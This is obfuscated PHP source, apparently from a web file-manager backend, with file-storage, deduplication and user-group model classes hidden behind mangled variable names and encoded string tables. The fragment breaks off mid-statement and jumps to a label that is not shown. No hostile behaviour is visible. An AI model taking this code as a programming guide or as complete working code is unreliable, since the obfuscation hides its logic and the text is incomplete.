<?php
 goto bØÏìå«øì; F…ò¼˜¨÷: class FileContentModel extends ModelBase { protected $tableName = "\x69\157\137\x66\151\154\x65\137\143\157\x6e\x74\145\x6e\x74\163"; protected $dataAuto = array(array("\143\162\145\x61\164\x65\124\x69\155\x65", "\164\x69\155\145", "\151\156\x73\x65\x72\164", "\146\165\x6e\143\x74\x69\x6f\x6e")); } class FileModel extends ModelBase { protected $tableName = "\151\x6f\x5f\146\x69\x6c\145"; protected $tableMeta = array("\x74\141\x62\x6c\x65\x4e\x61\x6d\x65" => "\151\157\137\146\x69\154\145\x5f\x6d\145\164\141", "\x6d\145\164\141\106\151\x65\x6c\x64" => "\146\x69\x6c\x65\x49\104"); public function fileInfo($™Ä˜”å) { $¹Ù€÷“Û =& $_SERVER[Î·Ü›öğ]; static $„Š—Ş‰‡ = array(); if (!isset($„Š—Ş‰‡[$™Ä˜”å])) { $ÒõãÎ› = $¹Ù€÷“Û[2060]; $š›ùìà = Model($¹Ù€÷“Û[557])->field($ÒõãÎ›)->where(array($¹Ù€÷“Û[555] => $™Ä˜”å))->find(); $„Š—Ş‰‡[$™Ä˜”å] = $š›ùìà; } return $„Š—Ş‰‡[$™Ä˜”å]; } public function addFileByContent($Ä¶Û”Ø = '', $æò³°ßê, $ĞµÎ¾¾ = '') { $ ˜İÄÊõ =& $_SERVER[Î·Ü›öğ]; $„†ª­ªÛ = TEMP_PATH . $ ˜İÄÊõ[2061]; if (!is_dir($„†ª­ªÛ)) { mk_dir($„†ª­ªÛ); } $Ÿ§»Şæ– = $„†ª­ªÛ . $ ˜İÄÊõ[2062] . rand_string(16); $úŒ¤ìÜÌ = file_put_contents($Ÿ§»Şæ–, $Ä¶Û”Ø); if ($úŒ¤ìÜÌ === !1 || strlen($Ä¶Û”Ø) != $úŒ¤ìÜÌ) { return !1; } $ÉŞú¼Ù = $this->addFile($Ÿ§»Şæ–, $æò³°ßê, $ĞµÎ¾¾, !0); if (file_exists($Ÿ§»Şæ–)) { @unlink($Ÿ§»Şæ–); } return $ÉŞú¼Ù; } public function createFileName($ºÊû§à, $½·´¥»Ñ, $ÈÂµ·å‰ = false, $¡²í¤ò“ = false) { $ˆ€¬Áãü =& $_SERVER[Î·Ü›öğ]; $àã²ÈœË = IO::init($ˆ€¬Áãü[8]); $§„îé‹Ê = $this->_makeFilePath($ºÊû§à, $½·´¥»Ñ, $àã²ÈœË, $ÈÂµ·å‰, $¡²í¤ò“); $½Âıà«ú = $àã²ÈœË->pathFather($§„îé‹Ê); static $áòË†¿ë = false; $™ˆÛ¡¤Ò = $ˆ€¬Áãü[2063] . md5($½Âıà«ú); if (!$áòË†¿ë && !Cache::get($™ˆÛ¡¤Ò)) { $áòË†¿ë = !0; $æ‚İÙ“ = IO::mkdir($½Âıà«ú); if (!IO::exist($æ‚İÙ“ . $ˆ€¬Áãü[891])) { IO::mkfile($æ‚İÙ“ . $ˆ€¬Áãü[891]); } Cache::set($™ˆÛ¡¤Ò, 1, 3600 * 2); } return $§„îé‹Ê; } public function _makeFilePath($œ£’®‰§, $åÏ›õ¢Á, $¤£°µıƒ, $İ«è›°ì = false, $æŞ¨“÷ = false) { $×ƒŒïÈ˜ =& $_SERVER[Î·Ü›öğ]; $ÚâÃ©Ïï = Model($×ƒŒïÈ˜[862])->get($×ƒŒïÈ˜[2064]); $‚ìÙ·Ü³ = $×ƒŒïÈ˜[1352] . $åÏ›õ¢Á[$×ƒŒïÈ˜[477]] . $×ƒŒïÈ˜[495] . date($×ƒŒïÈ˜[2065]); $·’ùì”ó = $‚ìÙ·Ü³ . rand_string(5) . short_id(100); $œ£’®‰§ = str_replace($×ƒŒïÈ˜[8], $×ƒŒïÈ˜[11], KodIO::clear($œ£’®‰§)); $İÒèò³Ù = $¤£°µıƒ->ext($œ£’®‰§); if (!$œ£’®‰§) { $ÚâÃ©Ïï = $×ƒŒïÈ˜[868]; } switch ($ÚâÃ©Ïï) { case $×ƒŒïÈ˜[2066]: if ($İÒèò³Ù) { $·’ùì”ó = $·’ùì”ó . $×ƒŒïÈ˜[10] . $İÒèò³Ù; } if ($İÒèò³Ù == $×ƒŒïÈ˜[2003]) { $·’ùì”ó .= $×ƒŒïÈ˜[1321]; } break; case $×ƒŒïÈ˜[2067]: $èÀ÷€®Ö = Model($×ƒŒïÈ˜[862])->get($×ƒŒïÈ˜[863]); $ì©æš˜ = substr(md5($×ƒŒïÈ˜[864] . $èÀ÷€®Ö . date($×ƒŒïÈ˜[838])), 0, 8); $‚ìÙ·Ü³ = $×ƒŒïÈ˜[1352] . $åÏ›õ¢Á[$×ƒŒïÈ˜[477]] . $×ƒŒïÈ˜[495] . date($×ƒŒïÈ˜[2068]) . $ì©æš˜ . $×ƒŒïÈ˜[8]; if ($İÒèò³Ù == $×ƒŒïÈ˜[2003]) { $œ£’®‰§ .= $×ƒŒïÈ˜[1321]; } $è†’õ™Ñ = $×ƒŒïÈ˜[2069] . $‚ìÙ·Ü³ . $œ£’®‰§; CacheLock::lock($è†’õ™Ñ); $·’ùì”ó = $‚ìÙ·Ü³ . $œ£’®‰§; if (IO::exist($‚ìÙ·Ü³ . $œ£’®‰§)) { $ÁÔ¾Ø Ä = substr($œ£’®‰§, 0, strlen($œ£’®‰§) - strlen($İÒèò³Ù)); $äÙßÖ£ = $æŞ¨“÷ ? substr($æŞ¨“÷, 0, 5) : ($İ«è›°ì ? substr($İ«è›°ì, 0, 5) : rand_string(5)); $äÙßÖ£ .= rand_string(3); $·’ùì”ó = $‚ìÙ·Ü³ . $ÁÔ¾Ø Ä . $äÙßÖ£; if ($İÒèò³Ù) { $·’ùì”ó = $·’ùì”ó . $×ƒŒïÈ˜[10] . $İÒèò³Ù; } } if (IO::isOsDriver($·’ùì”ó) && !IO::isUploadServer($·’ùì”ó)) { if (IO::exist($·’ùì”ó)) { CacheLock::unlock($è†’õ™Ñ); return $·’ùì”ó; } $´Ğ•øƒŸ = IO::setContent($·’ùì”ó, $×ƒŒïÈ˜[12]); if (!$´Ğ•øƒŸ) { show_json($×ƒŒïÈ˜[2070], !1); } } CacheLock::unlock($è†’õ™Ñ); break; case $×ƒŒïÈ˜[868]: break; default: break; } return $·’ùì”ó; } public function addFileByRemote($øêÄâï’, $Åˆü‚ı€, $ñ´«èÌ€ = array()) { $Üƒœ×²œ =& $_SERVER[Î·Ü›öğ]; if (!IO::isFile($øêÄâï’)) { return !1; } $ÉÛ‡¢À = $ñ´«èÌ€[$Üƒœ×²œ[560]] ? $ñ´«èÌ€[$Üƒœ×²œ[560]] : $Üƒœ×²œ[12]; $Í®¦õóÉ = IO::hashMd5($øêÄâï’, $ÉÛ‡¢À); $ÌŸÌË’ = KodIO::parse($øêÄâï’); $Õæ¯Æƒ” = array($Üƒœ×²œ[633] => IO::size($øêÄâï’), $Üƒœ×²œ[2071] => 1, $Üƒœ×²œ[505] => $Åˆü‚ı€, $Üƒœ×²œ[905] => $ÌŸÌË’[$Üƒœ×²œ[477]], $Üƒœ×²œ[506] => $øêÄâï’, $Üƒœ×²œ[2072] => $ñ´«èÌ€[$Üƒœ×²œ[688]] ? $ñ´«èÌ€[$Üƒœ×²œ[688]] : IO::hashSimple($øêÄâï’), $Üƒœ×²œ[2073] => $Í®¦õóÉ ? $Í®¦õóÉ : $ÉÛ‡¢À); if ($•›ş§ÍÑ = $this->addFileCheckExist($Õæ¯Æƒ”[$Üƒœ×²œ[688]], $Õæ¯Æƒ”[$Üƒœ×²œ[560]], $Õæ¯Æƒ”[$Üƒœ×²œ[79]])) { return $•›ş§ÍÑ; } return $this->addFileData($Õæ¯Æƒ”); } private function addFileData($İ×Â¿¯) { $ç½«è¥² =& $_SERVER[Î·Ü›öğ]; if (!$İ×Â¿¯) { return !1; } if (!IO::isFile($İ×Â¿¯[$ç½«è¥²[87]])) { return !1; } $İ×Â¿¯[$ç½«è¥²[79]] = intval($İ×Â¿¯[$ç½«è¥²[79]]); if (!$İ×Â¿¯[$ç½«è¥²[79]] && strlen($İ×Â¿¯[$ç½«è¥²[688]]) > 32) { $İ×Â¿¯[$ç½«è¥²[79]] = intval(substr($İ×Â¿¯[$ç½«è¥²[688]], 32)); } $„ì…™ = $this->add($İ×Â¿¯); return $this->find($„ì…™); } public function addFile($ÇÑÔşÆ¼, $ –×”™ã, $‘Àõ„“², $•óÑõ = false) { $¾¼Áû¶Î =& $_SERVER[Î·Ü›öğ]; $×ÑŞŒó™ = IO::hashSimple($ÇÑÔşÆ¼); $ÏÒãğ°¦ = IO::size($ÇÑÔşÆ¼); $³¸çêˆÌ = $ÏÒãğ°¦ <= 1024 * 1024 * 10 ? IO::hashMd5($ÇÑÔşÆ¼) : $¾¼Áû¶Î[12]; $’­ç…Ò… = $¾¼Áû¶Î[2074] . $×ÑŞŒó™; CacheLock::lock($’­ç…Ò…); if ($³¸çêˆÌ && $×ÑŞŒó™) { $¶é½ôñç = $this->addFileCheckExist($×ÑŞŒó™, $³¸çêˆÌ, $ÏÒãğ°¦); if ($¶é½ôñç) { CacheLock::unlock($’­ç…Ò…); return $¶é½ôñç; } } $Ó×Î˜Ç = $this->addFileMake($ÇÑÔşÆ¼, $ –×”™ã, $ÏÒãğ°¦, $×ÑŞŒó™, $³¸çêˆÌ, $‘Àõ„“², $•óÑõ); $‹ıÒñë… = $this->addFileData($Ó×Î˜Ç); if (!$‹ıÒñë…) { return !1; } CacheLock::unlock($’­ç…Ò…); if (!$³¸çêˆÌ && $‹ıÒñë…) { $this->fileMd5Check($‹ıÒñë…); } return $‹ıÒñë…; } public function fileMd5Check($¤«àÃ‘‰) { $ƒˆ±öĞÌ =& $_SERVER[Î·Ü›öğ]; $¶£…Ò§ü = array($¤«àÃ‘‰[$ƒˆ±öĞÌ[554]], $¤«àÃ‘‰[$ƒˆ±öĞÌ[87]]); $‡œÆêñ = $ƒˆ±öĞÌ[2075] . $¤«àÃ‘‰[$ƒˆ±öĞÌ[87]]; $åöø¾Ë¿ = $ƒˆ±öĞÌ[2076] . $¤«àÃ‘‰[$ƒˆ±öĞÌ[554]]; TaskQueue::add($ƒˆ±öĞÌ[2077], $¶£…Ò§ü, $‡œÆêñ, $åöø¾Ë¿); } public function fileMd5Set($äî¹Ê¾Œ, $ŒÍî—ç°) { $é•šàÕ¿ =& $_SERVER[Î·Ü›öğ]; $šµıÑî = $this->find($äî¹Ê¾Œ); if (!$šµıÑî || $šµıÑî[$é•šàÕ¿[560]]) { return; } $æÃ¶–ßù = IO::hashMd5($ŒÍî—ç°); if (!$æÃ¶–ßù) { return $é•šàÕ¿[12]; } $this->where(array($é•šàÕ¿[554] => $äî¹Ê¾Œ))->save(array($é•šàÕ¿[560] => $æÃ¶–ßù)); } public function addFileMake($İ¾Äøœ, $–Æ¦¡³­, $·ŸÕÍå, $ß®‰„©Ÿ, $Ì¹É²’Ï, $˜ü¡¥àˆ, $èóÇº»à) { $±Ç«†è° =& $_SERVER[Î·Ü›öğ]; $¯—³à°­ = $this->createFileName($˜ü¡¥àˆ, $–Æ¦¡³­, $ß®‰„©Ÿ, $Ì¹É²’Ï); $äğ³°¯€ = get_path_father($¯—³à°­); $õÊ‚  = get_path_this($¯—³à°­); if ($èóÇº»à) { $Õù¼´ó = IO::move($İ¾Äøœ, $äğ³°¯€, !1, $õÊ‚ ); } else { $Õù¼´ó = IO::copy($İ¾Äøœ, $äğ³°¯€, !1, $õÊ‚ ); } if (!$Õù¼´ó) { return !1; } $ıÃ½¥š¬ = IO::init($Õù¼´ó); $ıÃ½¥š¬->cacheMethod($±Ç«†è°[182], $ıÃ½¥š¬->path, $±Ç«†è°[179]); if (IO::size($Õù¼´ó) != $·ŸÕÍå) { return !1; } $ğ¸åÜÄÃ = array($±Ç«†è°[633] => $·ŸÕÍå, $±Ç«†è°[2071] => 1, $±Ç«†è°[505] => $˜ü¡¥àˆ, $±Ç«†è°[905] => $–Æ¦¡³­[$±Ç«†è°[477]], $±Ç«†è°[506] => $¯—³à°­, $±Ç«†è°[2072] => $ß®‰„©Ÿ, $±Ç«†è°[2073] => $Ì¹É²’Ï); return $ğ¸åÜÄÃ; } public function addFileCheckExist($‡şåÇëÜ, $òüØ¶á¢, $‘Ó‹˜úò) { $•äˆá¶É =& $_SERVER[Î·Ü›öğ]; $î‚Ø‹³Ë = $this->findByHash($‡şåÇëÜ, $òüØ¶á¢); if (!$î‚Ø‹³Ë) { return !1; } $É¨İÊ­Ë = array($•äˆá¶É[2071] => intval($î‚Ø‹³Ë[$•äˆá¶É[2078]]) + 1, $•äˆá¶É[633] => $‘Ó‹˜úò); $this->where(array($•äˆá¶É[555] => $î‚Ø‹³Ë[$•äˆá¶É[554]]))->save($É¨İÊ­Ë); return $î‚Ø‹³Ë; } public function remove($±š€•¡°) { $this->linkCountChange($±š€•¡°, !1); $this->clearEmpty(); return !0; } public function linkAdd($ßÙÉœğŸ) { $this->linkCountChange($ßÙÉœğŸ, !0); } public function linkCountChange($¾¸ˆ§„, $’‰Øíßø) { $Ô£¹ŞÉ³ =& $_SERVER[Î·Ü›öğ]; if (!$¾¸ˆ§„) { return; } if (!is_array($¾¸ˆ§„)) { $¾¸ˆ§„ = array($¾¸ˆ§„); } $¾Õó¥Ñ‘ = array(); foreach ($¾¸ˆ§„ as $Û…Â—ƒ©) { $Æñ¾¿ = $Û…Â—ƒ© . $Ô£¹ŞÉ³[12]; if (!$¾Õó¥Ñ‘[$Æñ¾¿]) { $¾Õó¥Ñ‘[$Æñ¾¿] = 0; } $¾Õó¥Ñ‘[$Æñ¾¿]++; } $‰¶™Â€ë = array(); foreach ($¾Õó¥Ñ‘ as $Û…Â—ƒ© => $€¦ŒÁš) { $Æñ¾¿ = $€¦ŒÁš . $Ô£¹ŞÉ³[12]; if (!$‰¶™Â€ë[$Æñ¾¿]) { $‰¶™Â€ë[$Æñ¾¿] = array(); } $‰¶™Â€ë[$Æñ¾¿][] = $Û…Â—ƒ©; } foreach ($‰¶™Â€ë as $€¦ŒÁš => $„Æ¸¬Ãù) { if (!$„Æ¸¬Ãù) { continue; } $€¦ŒÁš = $’‰Øíßø ? $€¦ŒÁš : -intval($€¦ŒÁš); $‚²•’¿ = array($Ô£¹ŞÉ³[554] => array($Ô£¹ŞÉ³[7], $„Æ¸¬Ãù)); if ($€¦ŒÁš < 0) { $‚²•’¿[$Ô£¹ŞÉ³[2078]] = array($Ô£¹ŞÉ³[1114], abs($€¦ŒÁš)); } $this->where($‚²•’¿)->setAdd($Ô£¹ŞÉ³[2078], $€¦ŒÁš); } } public function findByHash($¾ª¦§õ, $ÏÅÛ½€Ä = false) { $ıç•Âş =& $_SERVER[Î·Ü›öğ]; if (!$¾ª¦§õ && !$ÏÅÛ½€Ä) { return !1; } $ˆß­Íàè = array($ıç•Âş[2072] => $¾ª¦§õ); if ($ÏÅÛ½€Ä) { $ˆß­Íàè = array($ıç•Âş[2073] => $ÏÅÛ½€Ä); } return $this->order($ıç•Âş[2079])->where($ˆß­Íàè)->find(); } public function clearEmpty($ûŸÉ›´Ã = 1) { $Í¸€êñÒ =& $_SERVER[Î·Ü›öğ]; $£Ûä¥€© = time() - 3600 * 24 * $ûŸÉ›´Ã; $ìÙ»—¤ë = $Í¸€êñÒ[2080] . $£Ûä¥€©; $Ğı‘¦·Œ = $this->where($ìÙ»—¤ë)->select(); if (!$Ğı‘¦·Œ) { return; } $£õçÚŸÕ = new Task($Í¸€êñÒ[2081], $Í¸€êñÒ[12], count($Ğı‘¦·Œ)); foreach ($Ğı‘¦·Œ as $Ö²€ç¦Ş) { $£õçÚŸÕ->update(1); $this->resetFile($Ö²€ç¦Ş); } $£õçÚŸÕ->end(); } public function resetFile($ıÅÈô‰ù) { $®Î´äˆÌ =& $_SERVER[Î·Ü›öğ]; $Ú…§şîú = array($®Î´äˆÌ[555] => $ıÅÈô‰ù[$®Î´äˆÌ[554]]); $Ÿ—Ö®îõ = Model($®Î´äˆÌ[1458])->where($Ú…§şîú)->count(); $—§œ¤“÷ = Model($®Î´äˆÌ[2082])->where($Ú…§şîú)->count(); $¤á¡°ÄÉ = intval($Ÿ—Ö®îõ) + intval($—§œ¤“÷); if ($¤á¡°ÄÉ == 0) { Model($®Î´äˆÌ[2083])->delete($ıÅÈô‰ù[$®Î´äˆÌ[554]]); $this->where($Ú…§şîú)->delete(); $this->metaSet($ıÅÈô‰ù[$®Î´äˆÌ[554]], null, null); if (!IO::isFile($ıÅÈô‰ù[$®Î´äˆÌ[87]])) { write_log(array($®Î´äˆÌ[2084], ACTION, $ıÅÈô‰ù), $®Î´äˆÌ[1294]); return !1; } IO::remove($ıÅÈô‰ù[$®Î´äˆÌ[87]]); write_log(ACTION . $®Î´äˆÌ[930] . KodUser::id() . $®Î´äˆÌ[2085] . $ıÅÈô‰ù[$®Î´äˆÌ[554]] . $®Î´äˆÌ[2086] . $ıÅÈô‰ù[$®Î´äˆÌ[79]] . $®Î´äˆÌ[202] . $ıÅÈô‰ù[$®Î´äˆÌ[87]], $®Î´äˆÌ[2084]); return; } if ($ıÅÈô‰ù[$®Î´äˆÌ[2078]] != $¤á¡°ÄÉ) { $this->where($Ú…§şîú)->save(array($®Î´äˆÌ[2071] => $¤á¡°ÄÉ)); } } public function storageInfo($ßÌõ®• = false) { $‘ğàêÆ´ =& $_SERVER[Î·Ü›öğ]; $‚ŞıØÆ = $this->count() + 0.0; $‘òÎÊÕ† = 0; $À¼Ç½¥³ = 1; $ø±ßâ¥¦ = 0; $ÉÖí’è™ = 5000; for ($ÆÂù–”Â = 0; $ÆÂù–”Â < $‚ŞıØÆ; $ÆÂù–”Â = $ÆÂù–”Â + $ÉÖí’è™) { $Ÿ£ß„Æ  = $this->limit($ÆÂù–”Â, $ÆÂù–”Â + $ÉÖí’è™)->select(); foreach ($Ÿ£ß„Æ  as $›Ù¸ÃÅ) { $À¼Ç½¥³ += $›Ù¸ÃÅ[$‘ğàêÆ´[79]] * $›Ù¸ÃÅ[$‘ğàêÆ´[2078]]; $‘òÎÊÕ† += $›Ù¸ÃÅ[$‘ğàêÆ´[79]] * ($›Ù¸ÃÅ[$‘ğàêÆ´[2078]] - 1); $ø±ßâ¥¦ += $›Ù¸ÃÅ[$‘ğàêÆ´[2078]]; } } $í‘Ôî– = array($‘ğàêÆ´[2087] => $À¼Ç½¥³, $‘ğàêÆ´[2088] => $‘òÎÊÕ†, $‘ğàêÆ´[2089] => $‘òÎÊÕ† / $À¼Ç½¥³, $‘ğàêÆ´[83] => $‚ŞıØÆ, $‘ğàêÆ´[2090] => $ø±ßâ¥¦); return $í‘Ôî–; } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\x6f\x75\x70"; protected $tableMeta = array("\164\141\142\154\145\116\141\155\145" => "\x67\x72\x6f\165\x70\137\x6d\x65\164\x61", "\x6d\x65\164\141\x46\x69\145\x6c\x64" => "\147\x72\157\165\160\x49\x44"); protected function cacheFunctionAlias($‚çĞ·±¡) { $…ß…×ôŸ =& $_SERVER[Î·Ü›öğ]; return array($…ß…×ôŸ[2091] => array($‚çĞ·±¡[0], $…ß…×ôŸ[2092]), $…ß…×ôŸ[2093] => array($‚çĞ·±¡[0], $…ß…×ôŸ[2094])); } protected function getInfo($Ë¹ÇªÖ¬, $…€Ğãƒ = false) { $€…œâ¼® = $this->getInfoSimple($Ë¹ÇªÖ¬); if (!$€…œâ¼®) { return !1; } if ($…€Ğãƒ) { return $this->_listDataApplyItem($€…œâ¼®); } return $this->cacheFunctionGet($_SERVER[Î·Ü›öğ][2095], $Ë¹ÇªÖ¬); } protected function getInfoSimple($˜ì¥”¸, $ÍÇÇÚ­Ë = false) { $Ô´…ô¿È =& $_SERVER[Î·Ü›öğ]; if ($ÍÇÇÚ­Ë) { $Å§Æ‚µ™ = array($Ô´…ô¿È[1420] => intval($˜ì¥”¸)); $€Ú÷Ÿ°æ = $this->where($Å§Æ‚µ™)->find(); return is_array($€Ú÷Ÿ°æ) ? $€Ú÷Ÿ°æ : array(); } return $this->cacheFunctionGet($Ô´…ô¿È[2096], $˜ì¥”¸); } protected function groupAdd($÷ÕŞ”ı–) { $éà¨Á¤ =& $_SERVER[Î·Ü›öğ]; if (!$÷ÕŞ”ı–[$éà¨Á¤[193]] && isset($÷ÕŞ”ı–[$éà¨Á¤[1420]]) && $÷ÕŞ”ı–[$éà¨Á¤[1420]] == 1) { if ($ê£ØÂê­ = $this->getInfoSimple($÷ÕŞ”ı–[$éà¨Á¤[1420]], !0)) { return $÷ÕŞ”ı–[$éà¨Á¤[1420]]; } } else { $ê£ØÂê­ = $this->getInfoSimple($÷ÕŞ”ı–[$éà¨Á¤[193]]); if (!$ê£ØÂê­) { return !1; } } $£öğÀ¶ë = $éà¨Á¤[606]; if ($ê£ØÂê­[$éà¨Á¤[597]]) { $£öğÀ¶ë = $ê£ØÂê­[$éà¨Á¤[597]] . $ê£ØÂê­[$éà¨Á¤[1420]] . $éà¨Á¤[50]; } $ÆÄ‡÷Ç¢ = array($éà¨Á¤[505] => $this->groupNameAuto($÷ÕŞ”ı–[$éà¨Á¤[193]], $÷ÕŞ”ı–[$éà¨Á¤[32]]), $éà¨Á¤[488] => $÷ÕŞ”ı–[$éà¨Á¤[193]], $éà¨Á¤[668] => $£öğÀ¶ë, $éà¨Á¤[2097] => $÷ÕŞ”ı–[$éà¨Á¤[1997]], $éà¨Á¤[2098] => 0, $éà¨Á¤[2014] => 0); $÷ÕŞ”ı–[$éà¨Á¤[32]] = $ÆÄ‡÷Ç¢[$éà¨Á¤[32]]; if (isset($÷ÕŞ”ı–[$éà¨Á¤[2034]])) { $ÆÄ‡÷Ç¢[$éà¨Á¤[2034]] = $÷ÕŞ”ı–[$éà¨Á¤[2034]]; } else { $»Ò–»ş™ = $this->max($éà¨Á¤[2034]); if (!$»Ò–»ş™) { $»Ò–»ş™ = 0; } $ÆÄ‡÷Ç¢[$éà¨Á¤[2034]] = $»Ò–»ş™ + 1; } if (!empty($÷ÕŞ”ı–[$éà¨Á¤[1420]])) { $ÆÄ‡÷Ç¢[$éà¨Á¤[1420]] = $÷ÕŞ”ı–[$éà¨Á¤[1420]]; } $ˆ±Î€°† = $this->add($ÆÄ‡÷Ç¢); $this->groupMetaEdit($ˆ±Î€°†, $÷ÕŞ”ı–); Model($éà¨Á¤[1458])->groupRootAdd($ˆ±Î€°†); $this->_clearCache($÷ÕŞ”ı–[$éà¨Á¤[193]]); return $ˆ±Î€°†; } protected function groupEdit($Ò˜Ã‰ÍÃ, $Ñº®èÕù) { $Ğ¸ƒ€…¸ =& $_SERVER[Î·Ü›öğ]; $ÑÃ£¡¹² = $this->getInfoSimple($Ò˜Ã‰ÍÃ); if (!$ÑÃ£¡¹²) { return !1; } if (!empty($Ñº®èÕù[$Ğ¸ƒ€…¸[193]])) { $®ŞÊ´ñ = $this->getInfoSimple($Ñº®èÕù[$Ğ¸ƒ€…¸[193]]); if (!$®ŞÊ´ñ) { return !1; } if ($ÑÃ£¡¹²[$Ğ¸ƒ€…¸[1420]] == $®ŞÊ´ñ[$Ğ¸ƒ€…¸[1420]]) { return !1; } if ($Ñº®èÕù[$Ğ¸ƒ€…¸[193]] != $ÑÃ£¡¹²[$Ğ¸ƒ€…¸[193]]) { if ($®ŞÊ´ñ[$Ğ¸ƒ€…¸[597]] !== $ÑÃ£¡¹²[$Ğ¸ƒ€…¸[597]] && strpos($®ŞÊ´ñ[$Ğ¸ƒ€…¸[597]], $ÑÃ£¡¹²[$Ğ¸ƒ€…¸[597]] . $ÑÃ£¡¹²[$Ğ¸ƒ€…¸[1420]] . $Ğ¸ƒ€…¸[50]) === 0) { return !1; } $Ñº®èÕù[$Ğ¸ƒ€…¸[668]] = $®ŞÊ´ñ[$Ğ¸ƒ€…¸[597]] . $Ñº®èÕù[$Ğ¸ƒ€…¸[193]] . $Ğ¸ƒ€…¸[50]; $this->_changeChildLevel($ÑÃ£¡¹², $®ŞÊ´ñ); $this->_clearCache($®ŞÊ´ñ[$Ğ¸ƒ€…¸[1420]]); $this->_clearCache($ÑÃ£¡¹²[$Ğ¸ƒ€…¸[193]]); } } $this->groupMetaEdit($Ò˜Ã‰ÍÃ, $Ñº®èÕù); $this->_clearChildrenCache($ÑÃ£¡¹²); return $this->where(array($Ğ¸ƒ€…¸[2099] => $Ò˜Ã‰ÍÃ))->save($Ñº®èÕù); } private function groupMetaEdit($±•Ùş©”, &$Æ²âÜª) { $îÓŸÌÁÉ =& $_SERVER[Î·Ü›öğ]; if (isset($Æ²âÜª[$îÓŸÌÁÉ[32]])) { $this->setNamePinyin($±•Ùş©”, $Æ²âÜª[$îÓŸÌÁÉ[32]]); } if (isset($Æ²âÜª[$îÓŸÌÁÉ[2100]])) { $ìıœÁ¸š = array($îÓŸÌÁÉ[2100] => $Æ²âÜª[$îÓŸÌÁÉ[2100]], $îÓŸÌÁÉ[2101] => $Æ²âÜª[$îÓŸÌÁÉ[2101]]); unset($Æ²âÜª[$îÓŸÌÁÉ[2100]]); unset($Æ²âÜª[$îÓŸÌÁÉ[2101]]); if (isset($Æ²âÜª[$îÓŸÌÁÉ[2102]])) { $Æ¾äøé = $îÓŸÌÁÉ[1416] . $±•Ùş©”; $ğ£íº€è = $îÓŸÌÁÉ[1415]; $ıà Ãñù = $Æ²âÜª[$îÓŸÌÁÉ[2102]] ? $Æ²âÜª[$îÓŸÌÁÉ[2102]] : $îÓŸÌÁÉ[12]; $ä­¸ëı  = Model($îÓŸÌÁÉ[1414])->get($Æ¾äøé, $ğ£íº€è); $ä­¸ëı  = $ä­¸ëı  ? $ä­¸ëı  : $îÓŸÌÁÉ[12]; if ($ä­¸ëı  != $ıà Ãñù) { if (!$ıà Ãñù && $ä­¸ëı ) { Model($îÓŸÌÁÉ[1414])->remove($Æ¾äøé, $ğ£íº€è); } else { if ($ıà Ãñù) { Model($îÓŸÌÁÉ[1414])->set($Æ¾äøé, $ıà Ãñù, $ğ£íº€è); } } } $ìıœÁ¸š[$îÓŸÌÁÉ[2102]] = $ıà Ãñù; } $this->metaSet($±•Ùş©”, $ìıœÁ¸š); } } private function _clearChildrenCache($ö—Ô‚Ìù) { $‚•ôæÔç =& $_SERVER[Î·Ü›öğ]; $Œˆ‡¦Î™ = array($‚•ôæÔç[668] => array($‚•ôæÔç[628], $ö—Ô‚Ìù[$‚•ôæÔç[597]] . $ö—Ô‚Ìù[$‚•ôæÔç[1420]] . $‚•ôæÔç[629])); $©Şïàãú = $this->field($‚•ôæÔç[1420])->where($Œˆ‡¦Î™)->select(); foreach ($©Şïàãú as $Ò×áîÛ) { $this->_clearCache($Ò×áîÛ[$‚•ôæÔç[1420]]); } } private function _clearCache($§–ßË€é) { $ÑÍ¿ôŠĞ =& $_SERVER[Î·Ü›öğ]; $this->cacheFunctionClear($ÑÍ¿ôŠĞ[2095], $§–ßË€é); $this->cacheFunctionClear($ÑÍ¿ôŠĞ[2096], $§–ßË€é); } private function _changeChildLevel($ÊÃ§¥ , $‚‰î±µÀ, $ ¡®³ìô = false) { $°êš½ğ¿ =& $_SERVER[Î·Ü›öğ]; $œÛÜ¦¬Â = $ÊÃ§¥ [$°êš½ğ¿[597]] . $ÊÃ§¥ [$°êš½ğ¿[1420]] . $°êš½ğ¿[50]; $çªõÒ š = $‚‰î±µÀ[$°êš½ğ¿[597]] . $‚‰î±µÀ[$°êš½ğ¿[1420]] . $°êš½ğ¿[50] . $ÊÃ§¥ [$°êš½ğ¿[1420]] . $°êš½ğ¿[50]; if ($ ¡®³ìô) { $çªõÒ š = $‚‰î±µÀ[$°êš½ğ¿[597]] . $‚‰î±µÀ[$°êš½ğ¿[1420]] . $°êš½ğ¿[50]; } $»¸«êºŒ = array($°êš½ğ¿[668] => array($°êš½ğ¿[628], $ÊÃ§¥ [$°êš½ğ¿[597]] . $ÊÃ§¥ [$°êš½ğ¿[1420]] . $°êš½ğ¿[629])); $çëŸÈÄç = array($°êš½ğ¿[668] => array($°êš½ğ¿[677], "\162\145\160\154\x61\x63\x65\50\x70\141\162\x65\x6e\164\114\145\166\145\154\x2c\x27{$œÛÜ¦¬Â}\47\54\x27{$çªõÒ š}\x27\x29")); $this->_clearChildrenCache($ÊÃ§¥ ); $this->where($»¸«êºŒ)->data($çëŸÈÄç)->save(); } public function setNamePinyin($ıåğÊ˜’, $ŸËãşëé = false) { $ê‰‹“ñ =& $_SERVER[Î·Ü›öğ]; if (!$ŸËãşëé) { $²Şê™©Ñ = $this->getInfoSimple($ıåğÊ˜’); $ŸËãşëé = $²Şê™©Ñ[$ê‰‹“ñ[32]]; } if (!Input::check($ŸËãşëé, $ê‰‹“ñ[671])) { $this->metaSet($ıåğÊ˜’, $ê‰‹“ñ[549], null); $this->metaSet($ıåğÊ˜’, $ê‰‹“ñ[548], null); return; } $¥‡–ÉÀ¡ = array($ê‰‹“ñ[549] => str_replace($ê‰‹“ñ[53], $ê‰‹“ñ[12], Pinyin::get($ŸËãşëé)), $ê‰‹“ñ[548] => Pinyin::get($ŸËãşëé, $ê‰‹“ñ[672])); $this->metaSet($ıåğÊ˜’, $¥‡–ÉÀ¡); } protected function metaSet($ç™®÷ëÛ, $µÈªé¹Ø = null, $âĞ õ€Ï = null) { $this->_clearCache($ç™®÷ëÛ); return parent::metaSet($ç™®÷ëÛ, $µÈªé¹Ø, $âĞ õ€Ï); } protected function groupStatus($‰øÊ±ı, $›×ãº¦õ) { $ªËÒ¦–á =& $_SERVER[Î·Ü›öğ]; $­¢üû¯Ò = $this->getInfoSimple($‰øÊ±ı); if (!$­¢üû¯Ò) { return !1; } $this->_clearCache($‰øÊ±ı); return $this->metaSet($‰øÊ±ı, $ªËÒ¦–á[839], $›×ãº¦õ); if ($›×ãº¦õ == $ªËÒ¦–á[91]) { $ŞµÚÙƒğ = 